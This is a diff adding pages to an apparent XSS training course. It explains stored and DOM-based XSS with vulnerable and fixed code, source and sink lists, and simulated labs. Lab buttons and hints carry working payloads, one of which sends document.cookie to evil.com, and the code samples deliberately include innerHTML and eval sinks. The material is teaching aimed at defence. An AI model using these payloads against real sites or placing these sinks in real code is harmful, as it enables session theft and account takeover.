+        <span class="c-string">`&lt;b&gt;${</span><span class="c-danger">c.name</span><span class="c-string">}&lt;/b&gt;: ${</span><span class="c-danger">c.comment</span><span class="c-string">}`</span>
+    ).join(<span class="c-string">'&lt;br&gt;'</span>);
+    res.send(html);
+});
+
+<span class="c-comment">// ✅ FIXED — Use escape-html + template engine</span>
+<span class="c-keyword">const</span> esc = require(<span class="c-string">'escape-html'</span>);
+
+app.get(<span class="c-string">'/comments'</span>, <span class="c-keyword">async</span> (req, res) =&gt; {
+    <span class="c-keyword">const</span> comments = <span class="c-keyword">await</span> db.collection(<span class="c-string">'comments'</span>).find().toArray();
+    <span class="c-keyword">let</span> html = comments.map(c =&gt;
+        <span class="c-string">`&lt;b&gt;${</span><span class="c-safe">esc(c.name)</span><span class="c-string">}&lt;/b&gt;: ${</span><span class="c-safe">esc(c.comment)</span><span class="c-string">}`</span>
+    ).join(<span class="c-string">'&lt;br&gt;'</span>);
+    res.send(html);
+});</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- REFLECTED vs STORED COMPARISON -->
+    <h2 class="section-heading"><span class="sh-icon">⚖️</span> Reflected vs. Stored — Side by Side</h2>
+
+    <div class="comparison-wrap">
+        <table class="comparison-table">
+            <thead>
+                <tr>
+                    <th>Feature</th>
+                    <th style="color:var(--orange);">↩️ Reflected</th>
+                    <th style="color:var(--red);">💾 Stored</th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr><td>Persistence</td><td><span class="check-no">Non-persistent</span></td><td><span class="check-yes">Persistent (in DB)</span></td></tr>
+                <tr><td>Social Engineering</td><td><span class="check-no">✅ Required every time</span></td><td><span class="check-yes">❌ Not needed</span></td></tr>
+                <tr><td>Victims per Payload</td><td>1 per click</td><td><strong>All visitors</strong></td></tr>
+                <tr><td>Admin Compromise</td><td>Must trick admin to click</td><td><strong>Admin visits page = compromised</strong></td></tr>
+                <tr><td>Typical Severity</td><td><span class="severity-high">High</span></td><td><span class="severity-critical">Critical</span></td></tr>
+                <tr><td>Bug Bounty Reward</td><td>$$</td><td><strong>$$$$</strong></td></tr>
+                <tr><td>Payload Delivery</td><td>Via URL</td><td>Via form/input submission</td></tr>
+                <tr><td>Detection</td><td>Moderate (WAF can help)</td><td>Moderate (WAF + sanitize on output)</td></tr>
+            </tbody>
+        </table>
+    </div>
+
+    <!-- REAL WORLD IMPACT -->
+    <h2 class="section-heading"><span class="sh-icon">💥</span> Real-World Impact</h2>
+
+    <div class="grid-2">
+        <div class="card card-accent-red">
+            <div class="card-title"><div class="ct-icon" style="background:rgba(213,0,0,0.15)">🐛</div>Samy Worm (2005)</div>
+            <p class="body-text" style="font-size:0.85rem;">
+                Samy Kamkar injected a Stored XSS worm into his MySpace profile. It self-replicated, adding "samy is my hero" to every visitor's profile. <strong>1 million+ users infected in 20 hours.</strong> Samy was arrested and sentenced to 3 years probation.
+            </p>
+            <div class="flex flex-gap-8 flex-wrap">
+                <span class="tag tag-red">Self-Propagating</span>
+                <span class="tag tag-red">1M+ Victims</span>
+                <span class="tag tag-orange">20 Hours</span>
+            </div>
+        </div>
+        <div class="card card-accent-red">
+            <div class="card-title"><div class="ct-icon" style="background:rgba(213,0,0,0.15)">💳</div>British Airways (2018)</div>
+            <p class="body-text" style="font-size:0.85rem;">
+                Magecart Group 6 injected card-skimming JavaScript into BA's payment page. <strong>380,000 card details stolen over 15 days.</strong> ICO issued a £20 million GDPR fine. The attack leveraged stored/supply-chain JS injection.
+            </p>
+            <div class="flex flex-gap-8 flex-wrap">
+                <span class="tag tag-red">380K Cards</span>
+                <span class="tag tag-red">£20M Fine</span>
+                <span class="tag tag-orange">15 Days Undetected</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- LAB 2: STORED XSS -->
+    <div class="lab-container">
+        <div class="lab-banner">
+            <div class="lab-banner-icon">🧪</div>
+            <div class="lab-banner-text">
+                <h3>Lab 2: Stored XSS Simulation</h3>
+                <p>Inject a persistent XSS payload into a comment system and watch it fire for every visitor</p>
+            </div>
+            <div class="lab-difficulty">
+                <div class="lab-diff-label">Difficulty</div>
+                <div class="diff-dots">
+                    <div class="diff-dot active-medium"></div>
+                    <div class="diff-dot active-medium"></div>
+                    <div class="diff-dot"></div>
+                </div>
+            </div>
+        </div>
+        <div class="lab-body">
+            <div class="lab-objective">
+                <div class="lab-objective-label">🎯 Objective</div>
+                <p>This simulates a vulnerable comment system. Submit a comment containing an XSS payload. Notice how the stored payload persists and would execute for EVERY user who views the comments — including the site administrator!</p>
+            </div>
+
+            <div class="info-box danger">
+                <div class="ib-icon">👑</div>
+                <div class="ib-content">
+                    <strong>Admin Takeover Scenario:</strong>
+                    <p>Imagine an admin checks user comments for moderation. Your stored XSS runs in their browser — stealing their admin session token. Now you have full admin access!</p>
+                </div>
+            </div>
+
+            <!-- Two Column Layout -->
+            <div class="lab-panels">
+                <!-- INPUT PANEL -->
+                <div class="lab-panel">
+                    <div class="lab-panel-header">✍️ Submit as Attacker</div>
+                    <div class="lab-panel-body">
+                        <input type="text" id="stored-name" placeholder="Your display name…" class="lab-input" style="margin-bottom:10px;">
+                        <textarea id="stored-comment" placeholder="Write a comment… (try XSS payloads!)" class="lab-textarea" rows="4" style="font-family:var(--font-mono);"></textarea>
+
+                        <div class="flex flex-gap-8 flex-wrap mt-8">
+                            <button class="lab-btn lbtn-primary" onclick="submitStoredComment()">📮 Post Comment</button>
+                            <button class="lab-btn lbtn-reset" onclick="clearStoredComments()">🗑️ Clear All</button>
+                        </div>
+
+                        <div style="margin-top:14px;">
+                            <p style="font-size:0.72rem;color:var(--text-dim);text-transform:uppercase;letter-spacing:1px;margin-bottom:8px;">Quick Payloads</p>
+                            <div class="flex flex-gap-8 flex-wrap">
+                                <button class="lab-btn lbtn-reset" style="padding:5px 10px;font-size:0.75rem;" onclick="setStoredPayload('User', 'Great article! Thanks for sharing 👍')">Normal</button>
+                                <button class="lab-btn" style="padding:5px 10px;font-size:0.75rem;background:rgba(255,68,68,0.15);color:var(--red);border:1px solid rgba(255,68,68,0.3);" onclick="setStoredPayload('Hacker', '<script>alert(document.cookie)</script>')">Script Tag</button>
+                                <button class="lab-btn" style="padding:5px 10px;font-size:0.75rem;background:rgba(255,68,68,0.15);color:var(--red);border:1px solid rgba(255,68,68,0.3);" onclick="setStoredPayload('Attacker', '<img src=x onerror=alert(document.cookie)>')">Img Error</button>
+                                <button class="lab-btn" style="padding:5px 10px;font-size:0.75rem;background:rgba(255,68,68,0.15);color:var(--red);border:1px solid rgba(255,68,68,0.3);" onclick="setStoredPayload('Ghost', '<svg onload=fetch(`https://evil.com?c=`+document.cookie)>')">SVG Steal</button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- DISPLAY PANEL -->
+                <div class="lab-panel">
+                    <div class="lab-panel-header">
+                        👁️ Seen by ALL Visitors
+                        <span id="stored-count" style="margin-left:auto;background:var(--primary);color:white;padding:2px 8px;border-radius:10px;font-size:0.7rem;">0</span>
+                    </div>
+                    <div class="lab-panel-body" style="padding:0;">
+                        <!-- Simulated Social Media Comment Feed -->
+                        <div class="comment-system">
+                            <div class="cs-header">
+                                <span class="cs-logo">💬 CommentBox</span>
+                                <div class="cs-nav">
+                                    <span>Latest</span>
+                                    <span>Popular</span>
+                                </div>
+                            </div>
+                            <div class="cs-comments" id="stored-comments-list">
+                                <p style="color:#999;text-align:center;padding:20px 0;font-size:0.88rem;">No comments yet. Be the first to comment!</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Analysis Area -->
+            <div id="stored-analysis" style="margin-top:16px;"></div>
+
+            <!-- Hint -->
+            <div class="hint-wrapper">
+                <div class="hint-toggle" id="hint-toggle-stored" onclick="toggleHint('stored')">
+                    <span>💡</span>
+                    <span class="hint-label">Show Hints</span>
+                    <span class="hint-chevron">▼</span>
+                </div>
+                <div class="hint-body" id="hint-body-stored">
+                    <div class="hint-item">
+                        <div class="hint-num">1</div>
+                        <div>The comment system stores your input in a database and displays it to all visitors without encoding.</div>
+                    </div>
+                    <div class="hint-item">
+                        <div class="hint-num">2</div>
+                        <div>Try submitting <code>&lt;script&gt;alert('Stored XSS!')&lt;/script&gt;</code> as a comment.</div>
+                    </div>
+                    <div class="hint-item">
+                        <div class="hint-num">3</div>
+                        <div>Notice that once stored, the payload fires for EVERY visitor — the attacker doesn't need to do anything else!</div>
+                    </div>
+                    <div class="hint-item">
+                        <div class="hint-num">4</div>
+                        <div>The SVG payload uses <code>fetch()</code> to silently send cookies to an attacker server — no alert dialog shown to the victim.</div>
+                    </div>
+                    <div class="hint-item">
+                        <div class="hint-num">🛡️</div>
+                        <div><strong>Prevention:</strong> Always HTML-encode when displaying user content. Never trust data from the database — encode at output time.</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="page-nav">
+        <button class="btn btn-outline" onclick="navigateTo(2)">← Reflected XSS</button>
+        <button class="btn btn-primary" onclick="navigateTo(4)">Next: DOM-Based XSS →</button>
+    </div>
+</div>
+
+
+<!-- ================================================================
+     PAGE 4 — DOM-BASED XSS
+     ================================================================ -->
+<div class="page" id="page-4">
+    <div class="page-header">
+        <div class="chapter-badge badge-concept">🔀 Chapter 5</div>
+        <h1 class="page-title">DOM-Based XSS</h1>
+        <p class="page-subtitle">The invisible attacker. The server never sees the payload — the entire attack happens in the browser through JavaScript DOM manipulation. Traditional server-side tools completely miss it.</p>
+    </div>
+
+    <div class="grid-3" style="margin-bottom:30px;">
+        <div class="stat-card">
+            <span class="stat-num" style="background:linear-gradient(135deg,var(--cyan),var(--blue));-webkit-background-clip:text;-webkit-text-fill-color:transparent;">Type 0</span>
+            <span class="stat-label">Classification</span>
+        </div>
+        <div class="stat-card">
+            <span class="stat-num" style="background:linear-gradient(135deg,var(--cyan),var(--primary));-webkit-background-clip:text;-webkit-text-fill-color:transparent;">100%</span>
+            <span class="stat-label">Client-Side</span>
+        </div>
+        <div class="stat-card">
+            <span class="stat-num" style="background:linear-gradient(135deg,var(--red),var(--orange));-webkit-background-clip:text;-webkit-text-fill-color:transparent;">WAF Blind</span>
+            <span class="stat-label">Very hard to detect</span>
+        </div>
+    </div>
+
+    <!-- KEY DIFFERENCE -->
+    <div class="info-box info">
+        <div class="ib-icon">🔑</div>
+        <div class="ib-content">
+            <strong>Key Difference:</strong>
+            <p>In Reflected/Stored XSS, the <em>server</em> includes the payload in the HTML response. In DOM-based XSS, the server sends a <strong>completely clean response</strong> — the vulnerability is in how the <em>client-side JavaScript</em> processes user-controlled data. The server is innocent!</p>
+        </div>
+    </div>
+
+    <!-- HOW DOM XSS WORKS -->
+    <h2 class="section-heading"><span class="sh-icon">🔍</span> Source → Sink: The Core Concept</h2>
+
+    <p class="body-text">
+        DOM XSS requires two elements: a <strong style="color:var(--orange);">Source</strong> (where attacker-controlled data enters JavaScript) and a <strong style="color:var(--red);">Sink</strong> (a dangerous function that renders or executes the data). When untrusted data flows from Source to Sink without validation, DOM XSS occurs.
+    </p>
+
+    <div class="source-sink-diagram">
+        <div class="ss-column ss-source">
+            <div class="ss-column-title">📥 Sources (Input Points)</div>
+            <div class="ss-item">location.hash</div>
+            <div class="ss-item">location.search</div>
+            <div class="ss-item">location.href</div>
+            <div class="ss-item">document.URL</div>
+            <div class="ss-item">document.referrer</div>
+            <div class="ss-item">window.name</div>
+            <div class="ss-item">localStorage / sessionStorage</div>
+            <div class="ss-item">window.postMessage data</div>
+            <div class="ss-item">Web Socket messages</div>
+        </div>
+        <div class="ss-arrow">
+            <div class="arrow-symbol">➜</div>
+            <div>untrusted data<br>flows into</div>
+        </div>
+        <div class="ss-column ss-sink">
+            <div class="ss-column-title">⚠️ Sinks (Dangerous Functions)</div>
+            <div class="ss-item">element.innerHTML</div>
+            <div class="ss-item">element.outerHTML</div>
+            <div class="ss-item">document.write()</div>
+            <div class="ss-item">eval()</div>
+            <div class="ss-item">setTimeout(string)</div>
+            <div class="ss-item">setInterval(string)</div>
+            <div class="ss-item">location.href / assign / replace</div>
+            <div class="ss-item">jQuery.html() / .append()</div>
+            <div class="ss-item">insertAdjacentHTML()</div>
+        </div>
+    </div>
+
+    <!-- ATTACK FLOW -->
+    <h2 class="section-heading"><span class="sh-icon">🔄</span> Attack Flow</h2>
+
+    <div class="flow-container">
+        <div class="attack-steps">
+            <div class="attack-step" style="border-left-color:var(--cyan);">
+                <div class="as-num" style="background:var(--cyan);color:var(--dark);">1</div>
+                <div class="as-emoji">😈</div>
+                <div class="as-content">
+                    <h4>Attacker Crafts URL with Payload in Fragment</h4>
+                    <p><code style="color:var(--cyan);">vulnerable.com/welcome#&lt;img src=x onerror=alert(1)&gt;</code> — The <code>#</code> fragment is <strong>never sent to the server!</strong></p>
+                </div>
+            </div>
+            <div class="attack-step" style="border-left-color:var(--cyan);">
+                <div class="as-num" style="background:var(--cyan);color:var(--dark);">2</div>
+                <div class="as-emoji">📧</div>
+                <div class="as-content">
+                    <h4>Victim Clicks the Link</h4>
+                    <p>Browser sends request to server. Server responds with <strong>clean HTML + vulnerable JavaScript code</strong>. The server never sees the fragment.</p>
+                </div>
+            </div>
+            <div class="attack-step" style="border-left-color:var(--red);">
+                <div class="as-num" style="background:var(--red);">3</div>
+                <div class="as-emoji">💀</div>
+                <div class="as-content">
+                    <h4>JavaScript Reads Fragment → Writes to innerHTML</h4>
+                    <p>Client-side JS reads <code>location.hash</code> (SOURCE) and sets it as <code>element.innerHTML</code> (SINK). The browser parses the HTML, finds the event handler, and <strong>executes the script.</strong></p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- VULNERABLE CODE -->
+    <h2 class="section-heading"><span class="sh-icon">📝</span> Vulnerable Code Examples</h2>
+
+    <div class="code-block">
+        <div class="code-header">
+            <div class="code-dots"><span class="d d-red"></span><span class="d d-yellow"></span><span class="d d-green"></span></div>
+            <span class="code-lang">JavaScript — DOM XSS via location.hash + innerHTML</span>
+            <button class="code-copy-btn" onclick="copyCode(this)">⎘ Copy</button>
+        </div>
+        <div class="code-body"><span class="c-comment">// ❌ VULNERABLE — Classic DOM XSS</span>
+<span class="c-comment">// URL: page.html#&lt;img src=x onerror=alert(document.cookie)&gt;</span>
+
+<span class="c-keyword">var</span> name = <span class="c-danger">decodeURIComponent(location.hash.substring(1))</span>;
+<span class="c-comment">//           ↑ SOURCE: attacker-controlled data from URL fragment</span>
+
+document.getElementById(<span class="c-string">'greeting'</span>).<span class="c-danger">innerHTML</span> = <span class="c-string">"Hello, "</span> + name;
+<span class="c-comment">//                                       ↑ SINK: renders HTML + executes JS</span>
+
+<span class="c-comment">// ────────────────────────────────────────────────────────────</span>
+
+<span class="c-comment">// ✅ FIXED — Use textContent (safe sink)</span>
+<span class="c-keyword">var</span> name = decodeURIComponent(location.hash.substring(<span class="c-number">1</span>));
+document.getElementById(<span class="c-string">'greeting'</span>).<span class="c-safe">textContent</span> = <span class="c-string">"Hello, "</span> + name;
+<span class="c-comment">//                                       ↑ Renders as TEXT, not HTML</span>
+
+<span class="c-comment">// ────────────────────────────────────────────────────────────</span>
+
+<span class="c-comment">// ❌ Other vulnerable patterns:</span>
+<span class="c-danger">document.write(location.href)</span>;              <span class="c-comment">// Source → Sink</span>
+<span class="c-danger">eval(location.search.split('=')[1])</span>;         <span class="c-comment">// EXTREMELY dangerous</span>
+<span class="c-danger">$('#result').html($.urlParam('q'))</span>;          <span class="c-comment">// jQuery sink</span>
+<span class="c-danger">element.insertAdjacentHTML('beforeend', input)</span>;<span class="c-comment">// HTML insertion</span>
+<span class="c-danger">setTimeout(userInput, 1000)</span>;                 <span class="c-comment">// String eval</span></div>
+    </div>
+
+    <!-- WHY HARD TO DETECT -->
+    <h2 class="section-heading"><span class="sh-icon">🕵️</span> Why It's Invisible to Traditional Security</h2>
+
+    <div class="grid-2">
+        <div class="card card-accent-red">
+            <div class="card-title"><div class="ct-icon" style="background:rgba(213,0,0,0.15)">❌</div>What FAILS to Detect It</div>
+            <ul class="checklist">
+                <li><span class="cl-icon cl-no">✗</span> Server-side WAF — never sees the fragment payload</li>
+                <li><span class="cl-icon cl-no">✗</span> Server-side logging — fragment not in access logs</li>
+                <li><span class="cl-icon cl-no">✗</span> Input validation on server — no input to validate</li>
+                <li><span class="cl-icon cl-no">✗</span> Output encoding on server — response is already clean</li>
+                <li><span class="cl-icon cl-no">✗</span> Traditional DAST scanners miss many DOM XSS</li>
+            </ul>
+        </div>
+        <div class="card card-accent-green">
+            <div class="card-title"><div class="ct-icon" style="background:rgba(0,200,83,0.15)">✅</div>What WORKS</div>
+            <ul class="checklist">
+                <li><span class="cl-icon cl-yes">✓</span> Browser DevTools (Sources tab + breakpoints)</li>
+                <li><span class="cl-icon cl-yes">✓</span> Burp Suite DOM Invader extension</li>
+                <li><span class="cl-icon cl-yes">✓</span> Manual code review for Source → Sink flows</li>
+                <li><span class="cl-icon cl-yes">✓</span> Static analysis (Semgrep, CodeQL)</li>
+                <li><span class="cl-icon cl-yes">✓</span> Trusted Types API (browser-level defense)</li>
+                <li><span class="cl-icon cl-yes">✓</span> Using <code>textContent</code> instead of <code>innerHTML</code></li>
+            </ul>
+        </div>
+    </div>
+
+    <!-- KEY INSIGHT -->
+    <div class="feature-highlight">
+        <h3 style="margin-bottom:10px;font-size:1.05rem;">🧪 The Fragment (#) Never Reaches the Server</h3>
+        <div class="code-block mb-0">
+            <div class="code-header">
+                <div class="code-dots"><span class="d d-red"></span><span class="d d-yellow"></span><span class="d d-green"></span></div>
+                <span class="code-lang">URL Fragment Behavior</span>
+            </div>
+            <div class="code-body"><span class="c-comment">// Full URL victim clicks:</span>
+https://app.com/page<span class="c-danger">#&lt;script&gt;alert(1)&lt;/script&gt;</span>
+
+<span class="c-comment">// What the server receives in its access log:</span>
+GET /page HTTP/1.1     <span class="c-comment">← Fragment is STRIPPED! Server sees clean request</span>
+
+<span class="c-comment">// What the browser's JavaScript can read:</span>
+location.hash = <span class="c-danger">"#&lt;script&gt;alert(1)&lt;/script&gt;"</span>   <span class="c-comment">← Only JS can see it!</span>
+
+<span class="c-comment">// This is WHY DOM XSS bypasses all server-side protection!</span></div>
+        </div>
+    </div>
+
+    <!-- LAB 3: DOM-BASED XSS -->
+    <div class="lab-container">
+        <div class="lab-banner">
+            <div class="lab-banner-icon">🧪</div>
+            <div class="lab-banner-text">
+                <h3>Lab 3: DOM-Based XSS Simulation</h3>
+                <p>Exploit a Source → Sink vulnerability in client-side JavaScript</p>
+            </div>
+            <div class="lab-difficulty">
+                <div class="lab-diff-label">Difficulty</div>
+                <div class="diff-dots">
+                    <div class="diff-dot active-medium"></div>
+                    <div class="diff-dot active-medium"></div>
+                    <div class="diff-dot active-hard"></div>
+                </div>
+            </div>
+        </div>
+        <div class="lab-body">
+            <div class="lab-objective">
+                <div class="lab-objective-label">🎯 Objective</div>
+                <p>The page reads <code>location.hash</code> (a SOURCE) and writes it to <code>element.innerHTML</code> (a dangerous SINK). Craft a URL fragment that injects HTML with a JavaScript event handler to achieve DOM XSS.</p>
+            </div>
+
+            <!-- URL Builder -->
+            <div style="background:var(--dark3);border-radius:var(--radius-md);padding:20px;border:1px solid var(--border);margin:20px 0;">
+                <h4 style="font-size:0.85rem;color:var(--text-muted);margin-bottom:12px;">🔗 Craft Your Malicious URL</h4>
+                <div class="flex flex-gap-8" style="align-items:center;flex-wrap:wrap;">
+                    <code style="background:var(--dark5);padding:9px 14px;border-radius:8px;font-size:0.85rem;white-space:nowrap;color:var(--text-muted);border:1px solid var(--border);">vulnerable.com/welcome#</code>
+                    <input type="text" id="dom-payload" class="lab-input" placeholder="Enter name or XSS payload…"
+                           style="flex:1;min-width:200px;" value="Alice">
+                    <button class="lab-btn lbtn-primary" onclick="runDOMXSS()">▶ Execute</button>
+                </div>
+                <div class="dom-url-display" style="margin-top:10px;">
+                    <span class="dom-url-label">URL →</span>
+                    <span id="dom-url-display">vulnerable.com/welcome#Alice</span>
+                </div>
+            </div>
+
+            <!-- Quick Payloads -->
+            <div class="flex flex-gap-8 flex-wrap mb-16">
+                <button class="lab-btn lbtn-reset" style="font-size:0.8rem;" onclick="setDOMPayload('Alice')">👤 Normal</button>
+                <button class="lab-btn" style="font-size:0.8rem;background:rgba(0,221,255,0.12);color:var(--cyan);border:1px solid rgba(0,221,255,0.3);" onclick="setDOMPayload('<b style=color:red>Injected HTML!</b>')">🖌️ HTML Inject</button>
+                <button class="lab-btn" style="font-size:0.8rem;background:rgba(255,68,68,0.12);color:var(--red);border:1px solid rgba(255,68,68,0.3);" onclick="setDOMPayload('<img src=x onerror=alert(1)>')">🎯 Basic XSS</button>
+                <button class="lab-btn" style="font-size:0.8rem;background:rgba(255,68,68,0.12);color:var(--red);border:1px solid rgba(255,68,68,0.3);" onclick="setDOMPayload('<img src=x onerror=alert(document.cookie)>')">🍪 Cookie Steal</button>
+                <button class="lab-btn" style="font-size:0.8rem;background:rgba(255,68,68,0.12);color:var(--red);border:1px solid rgba(255,68,68,0.3);" onclick="setDOMPayload('<svg onload=alert(document.domain)>')">🌐 SVG Domain</button>
+                <button class="lab-btn" style="font-size:0.8rem;background:rgba(255,136,0,0.12);color:var(--orange);border:1px solid rgba(255,136,0,0.3);" onclick="setDOMPayload('<details open ontoggle=alert(1)>')">⚡ Details</button>
+            </div>
+
+            <!-- Simulated Browser -->
+            <div class="lab-browser">
+                <div class="browser-chrome">
+                    <div class="browser-dots">
+                        <span class="browser-dot bd-close"></span>
+                        <span class="browser-dot bd-min"></span>
+                        <span class="browser-dot bd-max"></span>
+                    </div>
+                    <div class="browser-url-bar">
+                        <span class="url-lock">🔒</span>
+                        <span class="url-text" id="dom-browser-url">vulnerable.com/welcome#Alice</span>
+                    </div>
+                </div>
+                <div class="browser-content" style="background:#e8f0fe;padding:0;">
+                    <div style="background:white;margin:20px;border-radius:12px;padding:28px;box-shadow:0 2px 12px rgba(0,0,0,0.08);">
+                        <div style="display:flex;align-items:center;gap:12px;margin-bottom:20px;padding-bottom:16px;border-bottom:2px solid #e8f0fe;">
+                            <div style="width:42px;height:42px;background:linear-gradient(135deg,#6c63ff,#4488ff);border-radius:50%;display:flex;align-items:center;justify-content:center;color:white;font-size:1.3rem;font-weight:bold;">W</div>
+                            <span style="font-weight:800;color:#333;font-size:1.05rem;">WelcomeApp</span>
+                            <span style="font-size:0.75rem;color:#aaa;margin-left:auto;">v2.0.1</span>
+                        </div>
+                        <p style="color:#888;margin-bottom:12px;font-size:0.9rem;">Welcome to our personalized portal!</p>
+                        <div id="dom-greeting" style="font-size:1.35rem;font-weight:800;color:#333;padding:12px 0;">
+                            Hello, Alice!
+                        </div>
+                        <p style="color:#bbb;font-size:0.72rem;margin-top:16px;border-top:1px solid #f0f0f0;padding-top:10px;">
+                            ⚙️ Name loaded from <code style="background:#f0f0f0;padding:2px 6px;border-radius:3px;color:#888;">location.hash</code> via <code style="background:#f0f0f0;padding:2px 6px;border-radius:3px;color:#d50000;">innerHTML</code>
+                        </p>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Analysis Panels -->
+            <div class="lab-panels" style="margin-top:20px;">
+                <div class="lab-panel">
+                    <div class="lab-panel-header">🔍 Source → Sink Data Flow Trace</div>
+                    <div class="lab-panel-body">
+                        <div class="lab-output" id="dom-trace" style="min-height:150px;font-size:0.8rem;">Enter a value above and click Execute to trace the data flow...</div>
+                    </div>
+                </div>
+                <div class="lab-panel">
+                    <div class="lab-panel-header">💡 The Vulnerable Code</div>
+                    <div class="lab-panel-body">
+                        <div class="code-block mb-0">
+                            <div class="code-header">
+                                <div class="code-dots"><span class="d d-red"></span><span class="d d-yellow"></span><span class="d d-green"></span></div>
+                                <span class="code-lang">welcome.js</span>
+                            </div>
+                            <div class="code-body" style="font-size:0.78rem;padding:14px;"><span class="c-comment">// SOURCE: Read from URL</span>
+<span class="c-keyword">var</span> name = <span class="c-danger">decodeURIComponent(
+    location.hash.substring(1)
+)</span>;
+
+<span class="c-comment">// SINK: Write to DOM!</span>
+document.getElementById(
+    <span class="c-string">'greeting'</span>
+).<span class="c-danger">innerHTML</span> =
+    <span class="c-string">"Hello, "</span> + name + <span class="c-string">"!"</span>;
+
+<span class="c-comment">// ✅ FIX: use .textContent</span></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div id="dom-result" style="margin-top:16px;"></div>
+
+            <!-- Hint -->
+            <div class="hint-wrapper" style="margin-top:16px;">
+                <div class="hint-toggle" id="hint-toggle-dom" onclick="toggleHint('dom')">
+                    <span>💡</span>
+                    <span class="hint-label">Show Hints</span>
+                    <span class="hint-chevron">▼</span>
+                </div>
+                <div class="hint-body" id="hint-body-dom">
+                    <div class="hint-item">
+                        <div class="hint-num">1</div>
+                        <div>The page reads <code>location.hash</code> — the part of the URL after <code>#</code>. This is the SOURCE.</div>
+                    </div>
+                    <div class="hint-item">
+                        <div class="hint-num">2</div>
+                        <div>The value is set via <code>innerHTML</code> — the SINK. This means HTML tags and event handlers will be parsed and executed!</div>
+                    </div>
+                    <div class="hint-item">
+                        <div class="hint-num">3</div>
+                        <div>Try <code>&lt;img src=x onerror=alert(1)&gt;</code> — the image fails to load, triggering the JavaScript in the <code>onerror</code> event handler.</div>
+                    </div>
+                    <div class="hint-item">
+                        <div class="hint-num">4</div>
+                        <div><strong>Key insight:</strong> The server sends the SAME response regardless of the URL fragment. The attack is 100% in the browser-side JavaScript!</div>
+                    </div>
+                    <div class="hint-item">
+                        <div class="hint-num">🛡️</div>
+                        <div><strong>Prevention:</strong> Replace <code>element.innerHTML</code> with <code>element.textContent</code>. Never pass user data to dangerous sinks!</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="page-nav">
+        <button class="btn btn-outline" onclick="navigateTo(3)">← Stored XSS</button>
+        <button class="btn btn-primary" onclick="navigateTo(5)">Next: Other XSS Types →</button>
+    </div>
+</div>
+
+
+<!-- ================================================================
+     PAGE 5 — OTHER XSS TYPES (Blind + Self — Theory Only)
+     ================================================================ -->
+<div class="page" id="page-5">
+    <div class="page-header">
+        <div class="chapter-badge badge-other">👁️ Chapter 6</div>
+        <h1 class="page-title">Other XSS Types</h1>
+        <p class="page-subtitle">Beyond the three main types, there are important XSS variants that every security practitioner should understand — Blind XSS and Self-XSS.</p>
+    </div>
+
+    <!-- BLIND XSS -->
+    <h2 class="section-heading"><span class="sh-icon">👁️‍🗨️</span> Blind XSS</h2>
+
+    <div class="info-box purple">
+        <div class="ib-icon">📖</div>
+        <div class="ib-content">
+            <strong>Definition:</strong>
+            <p>Blind XSS is a variant of <strong>Stored XSS</strong> where the attacker's payload executes in a <em>different application or context</em> that the attacker cannot directly access or observe — such as an admin panel, internal dashboard, log viewer, or support ticket system.</p>
+        </div>
+    </div>
+
+    <!-- VISUAL DIAGRAM -->
+    <div class="xss-type-visual" data-type="Blind XSS">
+        <h3 style="margin-bottom:18px;font-size:1.1rem;color:var(--text-bright);">How Blind XSS Works</h3>
+        <div class="scenario-box">
+            <div class="scenario-label">Attack Scenario</div>
+            <div class="scenario-actors">
+                <div class="actor-box">
+                    <div class="actor-icon" style="background:rgba(213,0,0,0.15);">😈</div>
+                    <div class="actor-label"><strong>Attacker</strong><br>Submits payload</div>
+                </div>
+                <div class="actor-arrow">──→</div>
+                <div class="actor-box">
+                    <div class="actor-icon" style="background:rgba(108,99,255,0.15);">📝</div>
+                    <div class="actor-label"><strong>Contact Form</strong><br>User-facing input</div>
+                </div>
+                <div class="actor-arrow">──→</div>
+                <div class="actor-box">
+                    <div class="actor-icon" style="background:rgba(0,200,83,0.15);">💾</div>
+                    <div class="actor-label"><strong>Database</strong><br>Stored raw</div>
+                </div>
+                <div class="actor-arrow">──→</div>
+                <div class="actor-box">
+                    <div class="actor-icon" style="background:rgba(255,204,0,0.15);">👑</div>
+                    <div class="actor-label"><strong>Admin Panel</strong><br>Renders payload</div>
+                </div>
+                <div class="actor-arrow">──→</div>
+                <div class="actor-box">
+                    <div class="actor-icon" style="background:rgba(213,0,0,0.2);">💀</div>
+                    <div class="actor-label"><strong>Admin Pwned</strong><br>Session stolen</div>
+                </div>
+            </div>
+        </div>
+        <p class="body-text mt-16" style="font-size:0.88rem;">
+            The attacker <strong>never sees the page where the payload executes</strong>. They inject it into a user-facing form, but it fires in an admin-only internal tool. The attacker uses an out-of-band callback (like XSS Hunter) to know when and where the payload triggered.
+        </p>
+    </div>
+
+    <!-- BLIND XSS COMMON SCENARIOS -->
+    <h3 class="sub-heading"><span class="dot"></span> Common Blind XSS Scenarios</h3>
+
+    <div class="grid-auto">
+        <div class="card card-accent-red">
+            <div class="card-title"><div class="ct-icon" style="background:rgba(213,0,0,0.15)">📧</div>Contact Forms</div>
+            <p style="font-size:0.84rem;color:var(--text-muted);">User submits a "contact us" message. The message is displayed in an internal CRM or admin dashboard without encoding. The admin's session is stolen.</p>
+        </div>
+        <div class="card card-accent-orange">
+            <div class="card-title"><div class="ct-icon" style="background:rgba(255,136,0,0.15)">📊</div>Log Viewers</div>
+            <p style="font-size:0.84rem;color:var(--text-muted);">Attacker injects payload in HTTP headers (User-Agent, Referer). When an admin views server logs in a web-based log viewer, the payload fires.</p>
+        </div>
+        <div class="card card-accent-yellow">
+            <div class="card-title"><div class="ct-icon" style="background:rgba(255,204,0,0.15)">🎫</div>Support Tickets</div>
+            <p style="font-size:0.84rem;color:var(--text-muted);">User creates a support ticket with XSS in the description. Support agent opens the ticket in their internal tool — payload executes in their browser.</p>
+        </div>
+        <div class="card card-accent-purple">
+            <div class="card-title"><div class="ct-icon" style="background:rgba(170,68,255,0.15)">🔔</div>Notification Systems</div>
+            <p style="font-size:0.84rem;color:var(--text-muted);">User registers with a malicious display name. When their name appears in admin notification panels or reports, the XSS fires.</p>
